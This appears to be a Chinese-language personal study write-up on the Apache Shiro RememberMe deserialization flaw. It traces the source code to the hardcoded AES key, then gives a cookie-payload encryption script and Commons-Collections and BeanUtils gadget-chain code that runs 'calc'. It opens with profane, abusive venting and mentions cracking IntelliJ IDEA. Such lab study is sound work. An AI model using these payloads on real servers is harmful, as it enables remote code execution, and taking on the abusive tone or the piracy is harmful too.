# 环境配置
我测你们马，sb环境配置，搞了半天，尤其是这个tomcat，nmd离谱！！！！！！！！
早くしね
## tomcat
离谱，网上大部分都是旗舰版的环境配置，一气之下我直接下了2023版本的idea，破了他。
首先下载好tomcat，官网上下载到本地。
然后配环境变量。
主要是idea，我只好用旗舰版，这是你们逼我的！
webserver选上tomcat，
然后配置中，点击部署，+，添加工件，就会把你的一些项目添加上去，自动运行，就会运行你的项目。
还有shiro下载：
https://github.com/phith0n/JavaThings/tree/master/shirodemo。
从这下吧。



# 找poc
入口AbstractRememberMeManager
```java
public void onSuccessfulLogin(Subject subject, AuthenticationToken token, AuthenticationInfo info) {
        this.forgetIdentity(subject);
        if (this.isRememberMe(token)) {
            this.rememberIdentity(subject, token, info);
        } else if (log.isDebugEnabled()) {
            log.debug("AuthenticationToken did not indicate RememberMe is requested.  RememberMe functionality will not be executed for corresponding account.");
        }

    }
```
判断token，这里要勾上RememberMe，进入if
## rememberIdentity1
```java
public void rememberIdentity(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo) {
        PrincipalCollection principals = this.getIdentityToRemember(subject, authcInfo);
        this.rememberIdentity(subject, principals);
    }
```
getIdentityToRemember，大概就是获得用户名
```java
protected PrincipalCollection getIdentityToRemember(Subject subject, AuthenticationInfo info) {
        return info.getPrincipals();
    }
```
## rememberIdentity2
```java
protected void rememberIdentity(Subject subject, PrincipalCollection accountPrincipals) {
        byte[] bytes = this.convertPrincipalsToBytes(accountPrincipals);
        this.rememberSerializedIdentity(subject, bytes);
    }
```
## convertPrincipalsToBytes
```java
protected byte[] convertPrincipalsToBytes(PrincipalCollection principals) {
        byte[] bytes = this.serialize(principals);
        if (this.getCipherService() != null) {
            bytes = this.encrypt(bytes);
        }

        return bytes;
    }

```
先序列化，然后加密。
```java
public CipherService getCipherService() {
        return this.cipherService;
    }
```
这里就需要赋值。
encrytype
```java
protected byte[] encrypt(byte[] serialized) {
        byte[] value = serialized;
        CipherService cipherService = this.getCipherService();
        if (cipherService != null) {
            ByteSource byteSource = cipherService.encrypt(serialized, this.getEncryptionCipherKey());
            value = byteSource.getBytes();
        }
```
getEncryptionCipherKey
```java
public byte[] getEncryptionCipherKey() {
        return this.encryptionCipherKey;
    }
```
encrypt
```java
public ByteSource encrypt(byte[] plaintext, byte[] key) {
        byte[] ivBytes = null;
        boolean generate = this.isGenerateInitializationVectors(false);
        if (generate) {
            ivBytes = this.generateInitializationVector(false);
            if (ivBytes == null || ivBytes.length == 0) {
                throw new IllegalStateException("Initialization vector generation is enabled - generated vectorcannot be null or empty.");
            }
        }
```
加密比较复杂，就这样吧。
返回，然后跟进rememberSerializedIdentity
```java
protected void rememberSerializedIdentity(Subject subject, byte[] serialized) {
        if (!WebUtils.isHttp(subject)) {
            if (log.isDebugEnabled()) {
                String msg = "Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet request and response in order to set the rememberMe cookie. Returning immediately and ignoring rememberMe operation.";
                log.debug(msg);
            }

        } else {
            HttpServletRequest request = WebUtils.getHttpRequest(subject);
            HttpServletResponse response = WebUtils.getHttpResponse(subject);
            String base64 = Base64.encodeToString(serialized);
            Cookie template = this.getCookie();
            Cookie cookie = new SimpleCookie(template);
            cookie.setValue(base64);
            cookie.saveTo(request, response);
        }
    }
```
进else，把一串常量base64处理，放在了cookie，这就是rememberme的过程。


解密：
```java
public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
        PrincipalCollection principals = null;
        try {
            byte[] bytes = getRememberedSerializedIdentity(subjectContext);
            //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:
            if (bytes != null && bytes.length > 0) {
                principals = convertBytesToPrincipals(bytes, subjectContext);
            }
        } catch (RuntimeException re) {
            principals = onRememberedPrincipalFailure(re, subjectContext);
        }

        return principals;
    }
```
获取加密的内容
convertBytesToPrincipals
```java
protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
        if (getCipherService() != null) {
            bytes = decrypt(bytes);
        }
        return deserialize(bytes);
    }
```
一步解密，一步反序列化。
看一下加密函数。
```java
protected byte[] decrypt(byte[] encrypted) {
        byte[] serialized = encrypted;
        CipherService cipherService = getCipherService();
        if (cipherService != null) {
            ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());
            serialized = byteSource.getBytes();
        }
        return serialized;
    }
```
加密函数结构
```java
ByteSource decrypt(byte[] encrypted, byte[] decryptionKey) throws CryptoException;
```
根据名字可知，第一个参数为密文，第二个参数为密钥。
接着寻找密钥
getDecryptionCipherKey
```java
public byte[] getDecryptionCipherKey() {
        return decryptionCipherKey;
    }
```
查找用法，看到写入值函数。
```java
public void setDecryptionCipherKey(byte[] decryptionCipherKey) {
        this.decryptionCipherKey = decryptionCipherKey;
    }
```
查找函数用法，在哪调用，获取参数。
```java
public void setCipherKey(byte[] cipherKey) {
        //Since this method should only be used in symmetric ciphers
        //(where the enc and dec keys are the same), set it on both:
        setEncryptionCipherKey(cipherKey);
        setDecryptionCipherKey(cipherKey);
    }
```
再找
```java
public AbstractRememberMeManager() {
        this.serializer = new DefaultSerializer<PrincipalCollection>();
        this.cipherService = new AesCipherService();
        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);
    }
```
发现大写变量，常量。
```java
private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
```
密钥成功找到。
# 构造恶意payload
这个payload好恶心，加密脚本比较难搞，本身不会密码学（轻点喷），只能借用大佬脚本。
首先用cc3链生成一个payload文件，然后
```java
package Enterprise.cc;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.util.ByteSource;
import org.apache.shiro.codec.Base64;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.nio.file.FileSystems;
import java.nio.file.Files;

public class shiro {
    public static void main(String[] args) throws Exception {
        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath("test.ser"));

        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));

        ByteSource ciphertext = aes.encrypt(payloads, key);
        BufferedWriter out = new BufferedWriter(new FileWriter("payload.txt"));
        out.write(ciphertext.toString());
        out.close();
        System.out.printf("OK");

    }
}

```
加密脚本，会生成一个payload.txt
如果有报错说某某什么日志问题，就去pom加点东西
```java
<dependency>
        <groupId>org.slf4j</groupId>
        <artifactId>slf4j-simple</artifactId>
        <version>1.7.25</version>
        <scope>compile</scope>
        </dependency>
```
生成一个payload打进去，会报错；
```java
Unable to load ObjectStreamClass [[Lorg.apache.commons.collections.Transformer;: static final long serialVersionUID = -4803604734341277543L;]: 
```
不能加载Lorg.apache.commons.collections.Transformer类，
```java
try {
            ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);
            @SuppressWarnings({"unchecked"})
            T deserialized = (T) ois.readObject();
            ois.close();
            return deserialized;
        } catch (Exception e) {
            String msg = "Unable to deserialze argument byte array.";
            throw new SerializationException(msg, e);
        }
    }
```
这里并没有用原生的ObjectInputStream的readObject，而是自己覆写了一个。
readobject会调用如下代码：
```java
protected Class<?> resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {
        try {
            return ClassUtils.forName(osc.getName());
        } catch (UnknownClassException e) {
            throw new ClassNotFoundException("Unable to load ObjectStreamClass [" + osc + "]: ", e);
        }
    }
}
```
调用的是ClassUtils.forName，不支持原生类，不支持数组，class.forName 不支持原生类它用于根据类名加载类，使用适当的类加载器。
ClassUtils.forName方法的作用是根据给定的类名和类加载器，加载并返回对应的Class对象。它可以处理基本类型、包装类、数组和常见的类名表示法，包括使用内部类的点分隔符、使用'[]'表示数组等。
所以payload不能出现数组类型。
打一个cc
```java
package Enterprise.cc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.misc.Unsafe;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class exp {
    public static void setValue(String name, Object target, Object value) {
        try {
            Field field = target.getClass().getDeclaredField(name);
            field.setAccessible(true);
            field.set(target, value);
        } catch (Exception ignore) {
        }
    }

    public  static  void  serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public  static  Object  unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void setValue(Object target, String name, Object value) throws Exception {
        Class c = target.getClass();
        Field field = c.getDeclaredField(name);
        field.setAccessible(true);
        field.set(target,value);
    }

    public static byte[] getTemplatesImpl(String cmd) {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("Evil");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = ctClass.makeClassInitializer();
            constructor.setBody(" try {\n" +
                    " Runtime.getRuntime().exec(\"" + cmd +
                    "\");\n" +
                    " } catch (Exception ignored) {\n" +
                    " }");
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }
    }

    public static void main(String[] args) throws Exception {
        //CC3
        TemplatesImpl templates = new TemplatesImpl();
        setValue(templates,"_name", "aaaaa");

        byte[] code = getTemplatesImpl("calc");
        byte[][] bytecodes = {code};
        setValue(templates, "_bytecodes", bytecodes);
        setValue(templates,"_tfactory", new TransformerFactoryImpl());

        //CC2
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);

        //CC6
        HashMap<Object,Object> map = new  HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates);

        HashMap<Object, Object> map2 = new HashMap<>();
        map2.put(tiedMapEntry, "bbb");
        lazyMap.remove(templates);

        Class c = LazyMap.class;
        Field field =  c.getDeclaredField("factory");
        field.setAccessible(true);
        field.set(lazyMap, invokerTransformer);

        serialize(map2);
        //unserialize("ser.bin");

    }
}
```
getTemplatesImpl设置到类池的操作，
类加载：类池用于加载类的定义信息，通过类名或类文件路径获取类的CtClass对象（编译时类的抽象表示）。
类创建：类池可以创建新的类，通过makeClass方法创建一个新的CtClass对象，并设置类的名称、父类、接口、字段、方法等。
类获取：类池可以获取已加载的类的CtClass对象，通过类名获取对应的CtClass对象，用于后续的类的修改和转换操作。
类修改：类池允许对已加载的类进行修改，可以修改类的字段、方法、注解等，添加新的字段和方法，修改现有的方法体等。
类转换：类池支持对类进行转换，例如修改类的父类、接口，添加/删除/修改类的方法和字段等。
类转字节码：类池可以将CtClass对象转换为字节码，通过toBytecode方法将CtClass对象转换为字节数组。

首先获取类池，而后创造一个恶意类"evil"，将evil的父类设置为AbstractTranslet，然后将获取construtor字段，并将其设置为恶意代码。

通过字节转化，解冻操作，返回恶意类。
hashMap:hashcode::tiedmap:getvalue->lazpmap:get->invokertransform。

# 打一个cb链
1.8.5的commons-bean是shiro自带的，可以打shiro链。
首先看一下bean的应用：
```java
package Enterprise.cc;
import org.apache.commons.beanutils.*;
import org.example.Person;


import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class BeanTest {
    public static void main (String[] args) throws Exception{
        Person person = new Person("katou",16);
        System.out.println(PropertyUtils.getProperty(person,"name"));
    }
}

```
调试跟进
```java
 public static Object getProperty(Object bean, String name) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException {
        return PropertyUtilsBean.getInstance().getProperty(bean, name);
    }
```
再进getproperty
```java
public Object getProperty(Object bean, String name) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException {
        return this.getNestedProperty(bean, name);
    }
```
```java
 public Object getNestedProperty(Object bean, String name)
            throws IllegalAccessException, InvocationTargetException,
            NoSuchMethodException {

        if (bean == null) {
            throw new IllegalArgumentException("No bean specified");
        }
        if (name == null) {
            throw new IllegalArgumentException("No name specified for bean class '" +
                    bean.getClass() + "'");
        }

        // Resolve nested references
        while (resolver.hasNested(name)) {
            String next = resolver.next(name);
            Object nestedBean = null;
            if (bean instanceof Map) {
                nestedBean = getPropertyOfMapBean((Map) bean, next);
            } else if (resolver.isMapped(next)) {
                nestedBean = getMappedProperty(bean, next);
            } else if (resolver.isIndexed(next)) {
                nestedBean = getIndexedProperty(bean, next);
            } else {
                nestedBean = getSimpleProperty(bean, next);
            }
            if (nestedBean == null) {
                throw new NestedNullException
                        ("Null property value for '" + name +
                        "' on bean class '" + bean.getClass() + "'");
            }
            bean = nestedBean;
            name = resolver.remove(name);
        }

        if (bean instanceof Map) {
            bean = getPropertyOfMapBean((Map) bean, name);
        } else if (resolver.isMapped(name)) {
            bean = getMappedProperty(bean, name);
        } else if (resolver.isIndexed(name)) {
            bean = getIndexedProperty(bean, name);
        } else {
            bean = getSimpleProperty(bean, name);
        }
        return bean;

    }
```
进入getSimpleProperty

在beancomparator里面：
```java
public int compare( Object o1, Object o2 ) {
        
        if ( property == null ) {
            // compare the actual objects
            return comparator.compare( o1, o2 );
        }
        
        try {
            Object value1 = PropertyUtils.getProperty( o1, property );
            Object value2 = PropertyUtils.getProperty( o2, property );
            return comparator.compare( value1, value2 );
        }
        catch ( IllegalAccessException iae ) {
            throw new RuntimeException( "IllegalAccessException: " + iae.toString() );
        } 
        catch ( InvocationTargetException ite ) {
            throw new RuntimeException( "InvocationTargetException: " + ite.toString() );
        }
        catch ( NoSuchMethodException nsme ) {
            throw new RuntimeException( "NoSuchMethodException: " + nsme.toString() );
        } 
    }
```
调用了getProperty
贴出链子：
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import sun.misc.Unsafe;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;
import java.util.PriorityQueue;

public class exp {

    public  static  void  serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public  static  Object  unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void setValue(Object target, String name, Object value) throws Exception {
        Class c = target.getClass();
        Field field = c.getDeclaredField(name);
        field.setAccessible(true);
        field.set(target,value);
    }

    public static byte[] getTemplatesImpl(String cmd) {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("Evil");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = ctClass.makeClassInitializer();
            constructor.setBody(" try {\n" +
                    " Runtime.getRuntime().exec(\"" + cmd +
                    "\");\n" +
                    " } catch (Exception ignored) {\n" +
                    " }");
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }
    }

    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();
        setValue(templates,"_name", "aaa");

        byte[] code = getTemplatesImpl("calc");
        byte[][] bytecodes = {code};
        setValue(templates, "_bytecodes", bytecodes);
        setValue(templates,"_tfactory", new TransformerFactoryImpl());

        BeanComparator outputProperties = new BeanComparator("outputProperties", new AttrCompare());

        TransformingComparator ioTransformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(ioTransformingComparator);

        priorityQueue.add(templates);
        priorityQueue.add(templates);

        setValue(priorityQueue, "comparator", outputProperties);

        serialize(priorityQueue);
        unserialize("ser.bin");

    }
}
```
但是里面有个字节二维数组，
服务器报错，不能反序列化字节数组：
```java
Unable to deserialze argument byte array
```
摆烂了，测。





